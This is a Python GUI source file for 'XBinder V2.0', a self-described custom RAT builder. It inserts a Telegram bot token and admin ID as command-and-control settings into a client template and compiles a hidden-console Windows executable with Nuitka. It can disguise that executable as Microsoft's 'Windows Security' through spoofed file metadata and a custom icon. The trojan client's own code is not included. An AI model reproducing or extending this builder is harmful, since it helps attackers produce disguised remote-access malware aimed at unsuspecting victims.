import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import os
import subprocess
import threading

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

TEMPLATE_FILE = "client_template.py"
OUTPUT_SCRIPT = "client.py"

class BuilderApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("XBinder V2.0 (Custom RAT Builder)")
        self.geometry("820x620")
        self.resizable(False, False)

        self.tabview = ctk.CTkTabview(self, width=800, height=580)
        self.tabview.pack(padx=10, pady=10)
        
        self.tabview.add("Files")
        self.tabview.add("Options")
        self.tab_builder = self.tabview.add("Builder")
        self.tabview.add("Pumper")
        self.tabview.add("IconChanger")
        self.tabview.add("Spoofer")
        self.tabview.add("About")

        self.build_ui()

    def build_ui(self):
        settings_frame = ctk.CTkFrame(self.tab_builder)
        settings_frame.pack(fill="x", padx=10, pady=10)
        ctk.CTkLabel(settings_frame, text="Settings", font=("Arial", 14, "bold")).pack(anchor="w", padx=10, pady=5)
        
        plat_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        plat_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(plat_frame, text="Platform:").pack(side="left", padx=5)
        ctk.CTkComboBox(plat_frame, values=["anycpu", "x64", "x86"]).pack(side="left", padx=5)
        
        net_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        net_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(net_frame, text=".Net:").pack(side="left", padx=5)
        ctk.CTkComboBox(net_frame, values=["v4.0", "v4.5", "v4.8"]).pack(side="left", padx=5)

        tg_frame = ctk.CTkFrame(self.tab_builder)
        tg_frame.pack(fill="x", padx=10, pady=10)
        ctk.CTkLabel(tg_frame, text="Telegram C2", font=("Arial", 14, "bold")).pack(anchor="w", padx=10, pady=5)
        
        self.bot_token_entry = ctk.CTkEntry(tg_frame, placeholder_text="Bot Token", width=500)
        self.bot_token_entry.pack(anchor="w", padx=10, pady=5)
        
        self.admin_id_entry = ctk.CTkEntry(tg_frame, placeholder_text="Admin ID", width=500)
        self.admin_id_entry.pack(anchor="w", padx=10, pady=5)

        build_frame = ctk.CTkFrame(self.tab_builder)
        build_frame.pack(fill="x", padx=10, pady=10)
        ctk.CTkLabel(build_frame, text="Build", font=("Arial", 14, "bold")).pack(anchor="w", padx=10, pady=5)
        
        self.assembly_var = tk.BooleanVar()
        self.icon_var = tk.BooleanVar()
        ctk.CTkCheckBox(build_frame, text="Assembly (маскировка)", variable=self.assembly_var).pack(anchor="w", padx=10, pady=5)
        ctk.CTkCheckBox(build_frame, text="Icon", variable=self.icon_var).pack(anchor="w", padx=10, pady=5)

        self.build_btn = ctk.CTkButton(build_frame, text="⬇️ Build", command=self.start_build, height=40, font=("Arial", 16, "bold"))
        self.build_btn.pack(fill="x", padx=10, pady=20)

    def inject_and_save(self):
        token = self.bot_token_entry.get().strip()
        admin = self.admin_id_entry.get().strip()
        if not token or not admin:
            messagebox.showerror("Ошибка", "Токен и ID обязательны!")
            return False
        
        if not os.path.exists(TEMPLATE_FILE):
            messagebox.showerror("Ошибка", f"Файл {TEMPLATE_FILE} не найден!")
            return False
            
        with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
            content = f.read()
            
        content = content.replace("{{BOT_TOKEN}}", token).replace("{{ADMIN_ID}}", admin)
        
        with open(OUTPUT_SCRIPT, "w", encoding="utf-8") as f:
            f.write(content)
        
        return True

    def start_build(self):
        if not self.inject_and_save():
            return
        
        self.build_btn.configure(state="disabled", text="Сборка...")
        threading.Thread(target=self.build_process, daemon=True).start()

    def build_process(self):
        try:
            cmd = [
                "python", "-m", "nuitka",
                "--onefile",
                "--windows-disable-console",
                "--assume-yes-for-downloads",
                "--remove-output",
                OUTPUT_SCRIPT
            ]
            
            if self.assembly_var.get():
                cmd.extend([
                    "--windows-company-name=Microsoft Corporation",
                    "--windows-product-name=Windows Security",
                    "--windows-file-version=10.0.19041.1",
                    "--windows-product-version=10.0.19041.1"
                ])
            
            if self.icon_var.get():
                icon_path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
                if icon_path:
                    cmd.extend(["--windows-icon-from-ico", icon_path])

            process = subprocess.run(cmd, capture_output=True, text=True)
            
            if process.returncode == 0:
                self.after(0, lambda: messagebox.showinfo("Готово", "client.exe собран!"))
            else:
                self.after(0, lambda: messagebox.showerror("Ошибка", f"Ошибка:\n{process.stderr[-1000:]}"))
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Ошибка", str(e)))
        finally:
            self.after(0, lambda: self.build_btn.configure(state="normal", text="⬇️ Build"))

if __name__ == "__main__":
    app = BuilderApp()
    app.mainloop()
